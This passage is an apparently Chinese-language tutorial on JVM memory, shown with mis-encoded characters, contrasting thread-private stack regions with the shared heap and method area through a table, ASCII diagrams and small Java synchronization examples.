<table><thead><tr><th>ç‰¹æ€§</th><th>çº¿ç¨‹ç§æœ‰åŒºåŸŸ</th><th>çº¿ç¨‹å…±äº«åŒºåŸŸ</th></tr></thead><tbody><tr><td><strong>ç”Ÿå‘½å‘¨æœŸ</strong></td><td>ä¸çº¿ç¨‹ç›¸åŒï¼Œçº¿ç¨‹åˆ›å»ºæ—¶åˆ›å»ºï¼Œçº¿ç¨‹é”€æ¯æ—¶é”€æ¯</td><td>ä¸JVMç›¸åŒï¼ŒJVMå¯åŠ¨æ—¶åˆ›å»ºï¼ŒJVMå…³é—­æ—¶é”€æ¯</td></tr><tr><td><strong>è®¿é—®æ–¹å¼</strong></td><td>çº¿ç¨‹ç‹¬ç«‹è®¿é—®ï¼Œæ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±çš„åŒºåŸŸ</td><td>æ‰€æœ‰çº¿ç¨‹å…±äº«è®¿é—®åŒä¸€ä¸ªåŒºåŸŸ</td></tr><tr><td><strong>çº¿ç¨‹å®‰å…¨</strong></td><td>å¤©ç„¶çº¿ç¨‹å®‰å…¨ï¼Œæ— éœ€åŒæ­¥æœºåˆ¶</td><td>éœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</td></tr><tr><td><strong>å­˜å‚¨å†…å®¹</strong></td><td>å±€éƒ¨å˜é‡ã€æ–¹æ³•å‚æ•°ã€è¿”å›å€¼ç­‰</td><td>å¯¹è±¡å®ä¾‹ã€ç±»ä¿¡æ¯ã€å¸¸é‡ç­‰</td></tr><tr><td><strong>å†…å­˜å ç”¨</strong></td><td>ä¸çº¿ç¨‹æ•°æˆæ­£æ¯”ï¼ˆæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰æ ˆï¼‰</td><td>ä¸å¯¹è±¡æ•°ç›¸å…³ï¼Œä¸çº¿ç¨‹æ•°æ— å…³</td></tr><tr><td><strong>GCå½±å“</strong></td><td>ä¸æ¶‰åŠGCï¼Œçº¿ç¨‹é”€æ¯æ—¶è‡ªåŠ¨å›æ”¶</td><td>GCçš„ä¸»è¦åŒºåŸŸï¼Œéœ€è¦åƒåœ¾å›æ”¶</td></tr><tr><td><strong>è®¿é—®é€Ÿåº¦</strong></td><td>å¿«é€Ÿï¼Œæ— éœ€åŒæ­¥ï¼Œç›´æ¥è®¿é—®</td><td>éœ€è¦åŒæ­¥ï¼Œå¯èƒ½è¾ƒæ…¢</td></tr><tr><td><strong>æ•°æ®éš”ç¦»</strong></td><td>çº¿ç¨‹é—´å®Œå…¨éš”ç¦»ï¼Œäº’ä¸å½±å“</td><td>çº¿ç¨‹é—´å¯ä»¥å…±äº«æ•°æ®</td></tr></tbody></table>
<p><strong>å®é™…åº”ç”¨åœºæ™¯ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryAreaExample</span> {
    <span class="hljs-comment">// é™æ€å˜é‡ â†’ æ–¹æ³•åŒºï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">classVar</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å±€éƒ¨å˜é‡ â†’ è™šæ‹Ÿæœºæ ˆï¼ˆç§æœ‰åŒºåŸŸï¼‰</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">localVar</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;
        
        <span class="hljs-comment">// å¯¹è±¡åˆ›å»º â†’ å †ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
        <span class="hljs-comment">// å¯¹è±¡å¼•ç”¨ â†’ è™šæ‹Ÿæœºæ ˆï¼ˆç§æœ‰åŒºåŸŸï¼‰</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// objå¼•ç”¨åœ¨æ ˆä¸­ï¼ŒObjectå¯¹è±¡åœ¨å †ä¸­</span>
        
        <span class="hljs-comment">// é™æ€å˜é‡è®¿é—® â†’ éœ€è¦åŒæ­¥ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
        <span class="hljs-keyword">synchronized</span> (MemoryAreaExample.class) {
            classVar++;
        }
        
        <span class="hljs-comment">// å±€éƒ¨å˜é‡è®¿é—® â†’ æ— éœ€åŒæ­¥ï¼ˆç§æœ‰åŒºåŸŸï¼‰</span>
        localVar++;
    }
}
</code></pre>
<h5 data-id="heading-15">2.3.4 æ•°æ®å¦‚ä½•åœ¨ç§æœ‰åŒºåŸŸå’Œå…±äº«åŒºåŸŸä¹‹é—´æµè½¬</h5>
<p><strong>æ•°æ®æµè½¬çš„å®Œæ•´è¿‡ç¨‹ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">æ­¥éª¤1ï¼šçº¿ç¨‹ä»å…±äº«åŒºåŸŸè¯»å–å¯¹è±¡å¼•ç”¨åˆ°ç§æœ‰åŒºåŸŸ

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  å…±äº«åŒºåŸŸï¼ˆå †ï¼‰     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚  å¯¹è±¡å®ä¾‹    â”‚ â”‚
â”‚  â”‚  <span class="hljs-attr">value</span> = <span class="hljs-number">42</span>  â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚         â”‚         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
          â”‚ è¯»å–å¼•ç”¨
          â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç§æœ‰åŒºåŸŸï¼ˆæ ˆï¼‰     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚  objå¼•ç”¨     â”‚ â”‚ â† å¼•ç”¨å­˜å‚¨åœ¨æ ˆä¸­
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ­¥éª¤2ï¼šçº¿ç¨‹åœ¨ç§æœ‰åŒºåŸŸä¸­æ“ä½œå¯¹è±¡å¼•ç”¨

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç§æœ‰åŒºåŸŸï¼ˆæ ˆï¼‰     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚  objå¼•ç”¨     â”‚ â”‚ â† å¼•ç”¨åœ¨æ ˆä¸­
â”‚  â”‚  localVar    â”‚ â”‚ â† å±€éƒ¨å˜é‡ä¹Ÿåœ¨æ ˆä¸­
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ­¥éª¤3ï¼šçº¿ç¨‹é€šè¿‡å¼•ç”¨è®¿é—®å…±äº«åŒºåŸŸä¸­çš„å¯¹è±¡

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     é€šè¿‡å¼•ç”¨è®¿é—®      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç§æœ‰åŒºåŸŸï¼ˆæ ˆï¼‰     â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt; â”‚  å…±äº«åŒºåŸŸï¼ˆå †ï¼‰     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚                     â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚  objå¼•ç”¨     â”‚ â”‚                     â”‚  â”‚  å¯¹è±¡å®ä¾‹    â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚                     â”‚  â”‚  <span class="hljs-attr">value</span> = <span class="hljs-number">42</span>  â”‚ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
                                           â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ­¥éª¤4ï¼šä¿®æ”¹å…±äº«åŒºåŸŸä¸­çš„å¯¹è±¡ï¼ˆéœ€è¦åŒæ­¥ï¼‰

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     ä¿®æ”¹å¯¹è±¡         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç§æœ‰åŒºåŸŸï¼ˆæ ˆï¼‰     â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt; â”‚  å…±äº«åŒºåŸŸï¼ˆå †ï¼‰     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    (éœ€è¦åŒæ­¥)      â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚  objå¼•ç”¨     â”‚ â”‚                     â”‚  â”‚  å¯¹è±¡å®ä¾‹    â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚                     â”‚  â”‚  <span class="hljs-attr">value</span> = <span class="hljs-number">43</span>  â”‚ â”‚ â† è¢«ä¿®æ”¹
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
                                           â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å®é™…ç¤ºä¾‹ä»£ç ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataFlowExample</span> {
    <span class="hljs-comment">// å…±äº«å˜é‡ï¼šå­˜å‚¨åœ¨å †ä¸­ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">sharedValue</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processData</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. å±€éƒ¨å˜é‡å­˜å‚¨åœ¨ç§æœ‰åŒºåŸŸï¼ˆæ ˆï¼‰</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">localVar</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;  <span class="hljs-comment">// å­˜å‚¨åœ¨æ ˆçš„å±€éƒ¨å˜é‡è¡¨</span>
        
        <span class="hljs-comment">// 2. å¯¹è±¡å­˜å‚¨åœ¨å…±äº«åŒºåŸŸï¼ˆå †ï¼‰ï¼Œå¼•ç”¨å­˜å‚¨åœ¨ç§æœ‰åŒºåŸŸï¼ˆæ ˆï¼‰</span>
        <span class="hljs-type">DataFlowExample</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataFlowExample</span>();  <span class="hljs-comment">// å¯¹è±¡åœ¨å †ä¸­ï¼Œobjå¼•ç”¨åœ¨æ ˆä¸­</span>
        
        <span class="hljs-comment">// 3. é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> obj.sharedValue;  <span class="hljs-comment">// é€šè¿‡æ ˆä¸­çš„å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡</span>
        
        <span class="hljs-comment">// 4. ä¿®æ”¹å †ä¸­çš„å¯¹è±¡ï¼ˆéœ€è¦åŒæ­¥ï¼Œå› ä¸ºæ˜¯å…±äº«åŒºåŸŸï¼‰</span>
        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
            obj.sharedValue = <span class="hljs-number">100</span>;  <span class="hljs-comment">// ä¿®æ”¹å †ä¸­çš„å…±äº«å˜é‡ï¼Œéœ€è¦åŒæ­¥</span>
        }
        
        <span class="hljs-comment">// 5. å¤šä¸ªçº¿ç¨‹å¯ä»¥å…±äº«åŒä¸€ä¸ªå¯¹è±¡</span>
        <span class="hljs-comment">// å¦‚æœå¤šä¸ªçº¿ç¨‹æŒæœ‰åŒä¸€ä¸ªobjçš„å¼•ç”¨ï¼Œå®ƒä»¬éƒ½å¯ä»¥è®¿é—®å †ä¸­çš„åŒä¸€ä¸ªå¯¹è±¡</span>
    }
}
</code></pre>
<p><strong>å¤šçº¿ç¨‹ç¯å¢ƒä¸‹çš„æ•°æ®æµè½¬ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiThreadDataFlow</span> {
    <span class="hljs-comment">// å…±äº«å¯¹è±¡ï¼šå­˜å‚¨åœ¨å †ä¸­ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">SharedObject</span> <span class="hljs-variable">shared</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedObject</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// çº¿ç¨‹1</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-comment">// ä»å…±äº«åŒºåŸŸè¯»å–å¼•ç”¨ï¼ˆæ ˆä¸­çš„å¼•ç”¨æŒ‡å‘å †ä¸­çš„å¯¹è±¡ï¼‰</span>
            <span class="hljs-type">SharedObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> shared;  <span class="hljs-comment">// objå¼•ç”¨åœ¨æ ˆ1ä¸­ï¼ŒæŒ‡å‘å †ä¸­çš„sharedå¯¹è±¡</span>
            
            <span class="hljs-comment">// é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡</span>
            obj.setValue(<span class="hljs-number">1</span>);  <span class="hljs-comment">// ä¿®æ”¹å †ä¸­çš„å¯¹è±¡</span>
        });
        
        <span class="hljs-comment">// çº¿ç¨‹2</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-comment">// ä»å…±äº«åŒºåŸŸè¯»å–å¼•ç”¨ï¼ˆæ ˆä¸­çš„å¼•ç”¨æŒ‡å‘å †ä¸­çš„å¯¹è±¡ï¼‰</span>
            <span class="hljs-type">SharedObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> shared;  <span class="hljs-comment">// objå¼•ç”¨åœ¨æ ˆ2ä¸­ï¼ŒæŒ‡å‘åŒä¸€ä¸ªsharedå¯¹è±¡</span>
            
            <span class="hljs-comment">// é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡</span>
            obj.setValue(<span class="hljs-number">2</span>);  <span class="hljs-comment">// ä¿®æ”¹åŒä¸€ä¸ªå¯¹è±¡ï¼Œéœ€è¦åŒæ­¥</span>
        });
        
        thread1.start();
        thread2.start();
        
        <span class="hljs-comment">// ä¸¤ä¸ªçº¿ç¨‹çš„æ ˆæ˜¯ç‹¬ç«‹çš„ï¼ˆç§æœ‰åŒºåŸŸï¼‰</span>
        <span class="hljs-comment">// ä½†éƒ½é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„åŒä¸€ä¸ªå¯¹è±¡ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
        <span class="hljs-comment">// éœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</span>
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SharedObject</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(<span class="hljs-type">int</span> v)</span> {
        <span class="hljs-built_in">this</span>.value = v;
    }
}
</code></pre>
<h5 data-id="heading-16">2.3.5 ä¸ºä»€ä¹ˆéœ€è¦åŒºåˆ†ç§æœ‰åŒºåŸŸå’Œå…±äº«åŒºåŸŸ</h5>
<p><strong>è®¾è®¡åŸå› ï¼š</strong></p>
<ol>
<li>
<p><strong>æ€§èƒ½è€ƒè™‘</strong></p>
<ul>
<li><strong>ç§æœ‰åŒºåŸŸ</strong>ï¼šè®¿é—®å¿«é€Ÿï¼Œæ— éœ€åŒæ­¥æœºåˆ¶ï¼Œæé«˜æ‰§è¡Œæ•ˆç‡</li>
<li><strong>å…±äº«åŒºåŸŸ</strong>ï¼šç»Ÿä¸€ç®¡ç†ï¼Œå‡å°‘å†…å­˜å ç”¨ï¼Œæé«˜å†…å­˜åˆ©ç”¨ç‡</li>
</ul>
</li>
<li>
<p><strong>çº¿ç¨‹å®‰å…¨</strong></p>
<ul>
<li><strong>ç§æœ‰åŒºåŸŸ</strong>ï¼šå¤©ç„¶çº¿ç¨‹å®‰å…¨ï¼Œé¿å…æ•°æ®ç«äº‰ï¼Œç®€åŒ–ç¼–ç¨‹</li>
<li><strong>å…±äº«åŒºåŸŸ</strong>ï¼šéœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œä½†å…è®¸çº¿ç¨‹é—´é€šä¿¡</li>
</ul>
</li>
<li>
<p><strong>å†…å­˜ç®¡ç†</strong></p>
<ul>
<li><strong>ç§æœ‰åŒºåŸŸ</strong>ï¼šéšçº¿ç¨‹é”€æ¯è‡ªåŠ¨å›æ”¶ï¼Œç®¡ç†ç®€å•</li>
<li><strong>å…±äº«åŒºåŸŸ</strong>ï¼šéœ€è¦GCç»Ÿä¸€ç®¡ç†ï¼Œç”Ÿå‘½å‘¨æœŸé•¿</li>
</ul>
</li>
<li>
<p><strong>æ•°æ®éš”ç¦»</strong></p>
<ul>
<li><strong>ç§æœ‰åŒºåŸŸ</strong>ï¼šçº¿ç¨‹é—´æ•°æ®éš”ç¦»ï¼Œé¿å…ç›¸äº’å¹²æ‰°</li>
<li><strong>å…±äº«åŒºåŸŸ</strong>ï¼šå…è®¸çº¿ç¨‹é—´æ•°æ®å…±äº«å’Œé€šä¿¡ï¼Œå®ç°åä½œ</li>
</ul>
</li>
</ol>
<p><strong>å®é™…å¥½å¤„ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BenefitsExample</span> {
    <span class="hljs-comment">// å±€éƒ¨å˜é‡ï¼ˆç§æœ‰åŒºåŸŸï¼‰ï¼šæ— éœ€åŒæ­¥ï¼Œæ€§èƒ½å¥½</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">local</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// å­˜å‚¨åœ¨æ ˆä¸­ï¼Œçº¿ç¨‹ç§æœ‰ï¼Œæ— éœ€åŒæ­¥</span>
        local++;  <span class="hljs-comment">// å¿«é€Ÿï¼Œæ— éœ€åŠ é”</span>
    }
    
    <span class="hljs-comment">// å…±äº«å˜é‡ï¼ˆå…±äº«åŒºåŸŸï¼‰ï¼šéœ€è¦åŒæ­¥ï¼Œä½†å…è®¸çº¿ç¨‹é—´é€šä¿¡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">shared</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// å­˜å‚¨åœ¨å †ä¸­ï¼Œçº¿ç¨‹å…±äº«</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        shared++;  <span class="hljs-comment">// éœ€è¦åŒæ­¥ï¼Œä½†å…è®¸å¤šä¸ªçº¿ç¨‹åä½œ</span>
    }
}
</code></pre>
<h5 data-id="heading-17">2.3.6 å¤šçº¿ç¨‹ç¯å¢ƒä¸‹çš„å·¥ä½œæµç¨‹</h5>
<p><strong>å¤šçº¿ç¨‹è®¿é—®å…±äº«å¯¹è±¡çš„å®Œæ•´æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">åœºæ™¯ï¼šä¸‰ä¸ªçº¿ç¨‹è®¿é—®å †ä¸­çš„ä¸¤ä¸ªå…±äº«å¯¹è±¡

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          å…±äº«åŒºåŸŸï¼ˆå †ï¼‰                        â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚         Javaå †                       â”‚   â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚   â”‚
â”‚  â”‚  â”‚   å¯¹è±¡<span class="hljs-selector-tag">A</span>    â”‚  â”‚   å¯¹è±¡<span class="hljs-selector-tag">B</span>    â”‚    â”‚   â”‚
â”‚  â”‚  â”‚ value = <span class="hljs-number">1</span>  â”‚  â”‚ value = <span class="hljs-number">2</span>  â”‚    â”‚   â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜    â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
            â”‚               â”‚
            â”‚               â”‚
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”˜               â””â”€â”€â”€â”€â”€â”€â”€â”
    â”‚                               â”‚
    â†“                               â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ç§æœ‰åŒºåŸŸ â”‚                     â”‚ ç§æœ‰åŒºåŸŸ â”‚
â”‚ (æ ˆ<span class="hljs-number">1</span>)   â”‚                     â”‚ (æ ˆ<span class="hljs-number">2</span>)   â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â” â”‚                     â”‚ â”Œâ”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚objA â”‚ â”‚                     â”‚ â”‚objB â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”˜ â”‚                     â”‚ â””â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    â†‘                               â†‘
    â”‚                               â”‚
    â”‚                               â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ çº¿ç¨‹<span class="hljs-number">1</span>   â”‚                     â”‚ çº¿ç¨‹<span class="hljs-number">2</span>   â”‚
â”‚ è®¿é—®<span class="hljs-selector-tag">A</span>   â”‚                     â”‚ è®¿é—®<span class="hljs-selector-tag">B</span>   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

            â”‚
            â†“
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚  ç§æœ‰åŒºåŸŸ      â”‚
    â”‚  (æ ˆ<span class="hljs-number">3</span>)        â”‚
    â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
    â”‚  â”‚objAå¼•ç”¨ â”‚  â”‚ â† ä¹ŸæŒ‡å‘å¯¹è±¡<span class="hljs-selector-tag">A</span>
    â”‚  â”‚objBå¼•ç”¨ â”‚  â”‚ â† ä¹ŸæŒ‡å‘å¯¹è±¡<span class="hljs-selector-tag">B</span>
    â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
            â†‘
            â”‚
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”˜
    â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ çº¿ç¨‹<span class="hljs-number">3</span>   â”‚
â”‚ è®¿é—®<span class="hljs-selector-tag">A</span>å’Œ<span class="hljs-selector-tag">B</span>â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

å·¥ä½œæµç¨‹ï¼š
<span class="hljs-number">1</span>. æ¯ä¸ªçº¿ç¨‹çš„æ ˆæ˜¯ç‹¬ç«‹çš„ï¼ˆç§æœ‰åŒºåŸŸï¼‰
<span class="hljs-number">2</span>. å¤šä¸ªçº¿ç¨‹å¯ä»¥å…±äº«å †ä¸­çš„å¯¹è±¡ï¼ˆå…±äº«åŒºåŸŸï¼‰
<span class="hljs-number">3</span>. çº¿ç¨‹é€šè¿‡æ ˆä¸­çš„å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡
<span class="hljs-number">4</span>. è®¿é—®å…±äº«å¯¹è±¡éœ€è¦åŒæ­¥æœºåˆ¶ï¼ˆsynchronizedã€volatileç­‰ï¼‰
</code></pre>
<p><strong>å®é™…ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiThreadWorkflow</span> {
    <span class="hljs-comment">// å…±äº«å¯¹è±¡ï¼šå­˜å‚¨åœ¨å †ä¸­ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">SharedResource</span> <span class="hljs-variable">resource1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedResource</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">SharedResource</span> <span class="hljs-variable">resource2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedResource</span>();
    
